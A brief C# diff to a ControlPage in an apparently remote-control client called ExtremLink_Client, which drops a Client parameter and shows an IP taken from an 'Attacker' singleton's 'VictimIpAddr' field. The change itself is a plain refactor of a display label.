@@ -25,18 +25,16 @@ namespace ExtremLink_Client.Pages
 
         // Attirbutes:
         private ContentControl contentMain;
-        private Client client;
         private CustomMouse customMouse = CustomMouse.CustomMouseInstance;
         private CustomKeyboard customKeyboard = CustomKeyboard.CustomKeyboardInstance;
         private Session currentSession;
         private Thread recordingThread;
 
 
-        public ControlPage(ContentControl contentMain, Client client)
+        public ControlPage(ContentControl contentMain)
         {
             this.contentMain = contentMain;
-            this.client = client;
-            this.clientIpTextBlock.Text = $"Client's IP: {this.client.ClientIpAddress}";
+            this.clientIpTextBlock.Text = $"Client's IP: {Attacker.AttackerInstance.VictimIpAddr}";
             InitializeComponent();
         }
 
